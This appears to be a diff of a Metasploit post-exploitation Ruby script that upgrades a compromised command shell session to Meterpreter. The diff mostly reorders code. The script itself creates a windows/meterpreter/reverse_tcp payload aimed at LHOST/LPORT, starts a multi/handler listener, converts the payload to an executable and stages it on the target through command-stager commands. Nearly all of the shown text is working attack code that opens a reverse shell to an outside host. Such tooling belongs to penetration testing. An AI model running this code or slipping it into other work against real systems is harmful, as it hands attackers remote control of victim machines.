@@ -10,56 +10,6 @@
 #
 
 
-raise RuntimeError, "You must select a session." if (not session)
-raise RuntimeError, "Selected session is not a command shell session!" if (session.type != "shell")
-
-# Check for required datastore options
-if (not session.exploit_datastore['LHOST'] or not session.exploit_datastore['LPORT'])
-	raise RuntimeError, "You must set LPORT and LHOST for this script to work."
-end
-
-lhost = session.exploit_datastore['LHOST']
-lport = session.exploit_datastore['LPORT']
-# maybe we want our sessions going to another instance?
-use_handler = true
-use_handler = nil if (session.exploit_datastore['DisablePayloadHandler'] == true)
-
-
-# Process special var/val pairs...
-# XXX: Not supported yet...
-#Msf::Ui::Common.process_cli_arguments($framework, ARGV)
-# Create the payload instance
-payload_name = 'windows/meterpreter/reverse_tcp'
-payload = framework.payloads.create(payload_name)
-options = 'LHOST='+lhost + ' LPORT='+lport
-buf = payload.generate_simple('OptionStr' => options)
-
-#
-# Spawn the handler if needed
-#
-mh = nil
-if (use_handler)
-	mh = framework.modules.create("exploit/multi/handler")
-	mh.datastore['LPORT'] = lport
-	mh.datastore['LHOST'] = lhost
-	mh.datastore['PAYLOAD'] = payload_name
-	mh.datastore['ExitOnSession'] = false
-	mh.datastore['EXITFUNC'] = 'process'
-	mh.exploit_simple(
-		'LocalInput'     => session.user_input,
-		'LocalOutput'    => session.user_output,
-		'Payload'        => payload_name,
-		'RunAsJob'       => true)
-	# It takes a little time for the resources to get set up, so sleep for
-	# a bit to make sure the exploit is fully working.  Without this,
-	# mod.get_resource doesn't exist when we need it.
-	select(nil, nil, nil, 0.5)
-	if framework.jobs[mh.job_id.to_s].nil?
-		raise RuntimeError, "Failed to start multi/handler - is it already running?"
-	end
-end
-
-
 #
 # Show the progress of the upload
 #
@@ -69,12 +19,65 @@ def progress(total, sent)
 end
 
 
+raise RuntimeError, "You must select a session." if (not session)
+raise RuntimeError, "Selected session is not a command shell session!" if (session.type != "shell")
+
+# Check for required datastore options
+if (not session.exploit_datastore['LHOST'] or not session.exploit_datastore['LPORT'])
+	raise RuntimeError, "You must set LPORT and LHOST for this script to work."
+end
+
+
+lhost = session.exploit_datastore['LHOST']
+lport = session.exploit_datastore['LPORT']
+
+# maybe we want our sessions going to another instance?
+use_handler = true
+use_handler = nil if (session.exploit_datastore['DisablePayloadHandler'] == true)
+
+# Process special var/val pairs...
+# XXX: Not supported yet...
+#Msf::Ui::Common.process_cli_arguments($framework, ARGV)
+
+
+# Create the payload instance
+payload_name = 'windows/meterpreter/reverse_tcp'
+payload = framework.payloads.create(payload_name)
+options = 'LHOST='+lhost + ' LPORT='+lport
+buf = payload.generate_simple('OptionStr' => options)
+
 #
-# Make the payload into an exe for the CmdStager
+# Spawn the handler if needed
 #
 aborted = false
 begin
-	
+
+	mh = nil
+	if (use_handler)
+		mh = framework.modules.create("exploit/multi/handler")
+		mh.datastore['LPORT'] = lport
+		mh.datastore['LHOST'] = lhost
+		mh.datastore['PAYLOAD'] = payload_name
+		mh.datastore['ExitOnSession'] = false
+		mh.datastore['EXITFUNC'] = 'process'
+		mh.exploit_simple(
+			'LocalInput'     => session.user_input,
+			'LocalOutput'    => session.user_output,
+			'Payload'        => payload_name,
+			'RunAsJob'       => true)
+		# It takes a little time for the resources to get set up, so sleep for
+		# a bit to make sure the exploit is fully working.  Without this,
+		# mod.get_resource doesn't exist when we need it.
+		select(nil, nil, nil, 0.5)
+		if framework.jobs[mh.job_id.to_s].nil?
+			raise RuntimeError, "Failed to start multi/handler - is it already running?"
+		end
+	end
+
+
+	#
+	# Make the payload into an exe for the CmdStager
+	#
 	lplat = [Msf::Platform::Windows]
 	larch = [ARCH_X86]
 	opts = {
@@ -100,7 +103,7 @@ begin
 	#
 	total_bytes = 0
 	cmds.each { |cmd| total_bytes += cmd.length }
-	
+
 
 	#
 	# Run the commands one at a time
@@ -114,7 +117,7 @@ begin
 		else
 			ret.strip!
 			if (not ret.empty?)
-				print_error(ret) 
+				print_error(ret)
 				aborted = true
 			end
 		end
